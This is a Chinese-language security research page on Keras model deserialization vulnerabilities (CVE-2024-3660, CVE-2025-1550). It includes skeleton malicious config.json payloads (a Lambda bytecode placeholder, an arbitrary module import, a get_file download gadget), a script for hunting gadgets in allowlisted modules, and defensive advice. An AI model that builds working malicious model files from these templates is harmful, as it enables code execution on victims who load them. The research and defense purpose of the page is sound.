# Keras模型反序列化RCE和小工具搜索

{{#include ../../banners/hacktricks-training.md}}

本页总结了针对Keras模型反序列化管道的实用利用技术，解释了本地.keras格式的内部结构和攻击面，并提供了一个研究人员工具包，用于查找模型文件漏洞（MFVs）和后修复小工具。

## .keras模型格式内部结构

一个.keras文件是一个ZIP归档，至少包含：
- metadata.json – 通用信息（例如，Keras版本）
- config.json – 模型架构（主要攻击面）
- model.weights.h5 – HDF5中的权重

config.json驱动递归反序列化：Keras导入模块，解析类/函数，并从攻击者控制的字典中重建层/对象。

Dense层对象的示例代码片段：
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
反序列化执行：
- 从模块/class_name 键导入模块和符号解析
- 使用攻击者控制的 kwargs 调用 from_config(...) 或构造函数
- 递归进入嵌套对象（激活、初始化器、约束等）

历史上，这向攻击者构造 config.json 暴露了三个原语：
- 控制导入哪些模块
- 控制解析哪些类/函数
- 控制传递给构造函数/from_config 的 kwargs

## CVE-2024-3660 – Lambda-layer 字节码 RCE

根本原因：
- Lambda.from_config() 使用 python_utils.func_load(...)，该函数对攻击者字节进行 base64 解码并调用 marshal.loads()；Python 反序列化可以执行代码。

利用思路（config.json 中的简化有效载荷）：
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
缓解措施：
- Keras 默认强制 safe_mode=True。除非用户明确选择 safe_mode=False，否则 Lambda 中的序列化 Python 函数会被阻止。

注意事项：
- 旧格式（较旧的 HDF5 保存）或旧代码库可能不执行现代检查，因此当受害者使用旧加载器时，“降级”风格的攻击仍然适用。

## CVE-2025-1550 – Keras ≤ 3.8 中的任意模块导入

根本原因：
- _retrieve_class_or_fn 使用了不受限制的 importlib.import_module()，并从 config.json 中获取攻击者控制的模块字符串。
- 影响：可以任意导入任何已安装的模块（或攻击者植入的模块在 sys.path 上）。导入时代码运行，然后使用攻击者的 kwargs 进行对象构造。

利用思路：
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
安全改进 (Keras ≥ 3.9):
- 模块白名单：导入限制为官方生态模块：keras, keras_hub, keras_cv, keras_nlp
- 安全模式默认：safe_mode=True 阻止不安全的 Lambda 序列化函数加载
- 基本类型检查：反序列化对象必须匹配预期类型

## 白名单内的后修复 gadget 表面

即使有白名单和安全模式，允许的 Keras 可调用对象之间仍然存在广泛的表面。例如，keras.utils.get_file 可以将任意 URL 下载到用户可选择的位置。

通过引用允许函数的 Lambda 的 gadget（不是序列化的 Python 字节码）：
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
重要限制：
- Lambda.call() 在调用目标可调用对象时，将输入张量作为第一个位置参数添加。选择的 gadget 必须能够容忍额外的位置参数（或接受 *args/**kwargs）。这限制了可行函数的选择。

允许的 gadget 的潜在影响：
- 任意下载/写入（路径植入，配置中毒）
- 根据环境的网络回调/类似 SSRF 的效果
- 如果写入的路径随后被导入/执行或添加到 PYTHONPATH，或者如果存在可写的执行时写入位置，则链式调用到代码执行

## 研究人员工具包

1) 在允许的模块中系统地发现 gadget

枚举 keras、keras_nlp、keras_cv、keras_hub 中的候选可调用对象，并优先考虑那些具有文件/网络/进程/环境副作用的对象。
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
2) 直接反序列化测试（不需要 .keras 存档）

将精心制作的字典直接输入 Keras 反序列化器，以了解接受的参数并观察副作用。
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) 跨版本探测和格式

Keras 存在于多个代码库/时代，具有不同的保护措施和格式：
- TensorFlow 内置 Keras: tensorflow/python/keras (遗留，计划删除)
- tf-keras: 单独维护
- 多后端 Keras 3 (官方): 引入原生 .keras

在代码库和格式之间重复测试 (.keras 与遗留 HDF5) 以发现回归或缺失的保护措施。

## 防御建议

- 将模型文件视为不受信任的输入。仅从受信任的来源加载模型。
- 保持 Keras 更新；使用 Keras ≥ 3.9 以受益于白名单和类型检查。
- 加载模型时不要设置 safe_mode=False，除非您完全信任该文件。
- 考虑在一个沙箱、最低特权的环境中运行反序列化，且没有网络出口并限制文件系统访问。
- 在可能的情况下，强制执行模型来源和完整性检查的白名单/签名。

## 参考文献

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)

{{#include ../../banners/hacktricks-training.md}}
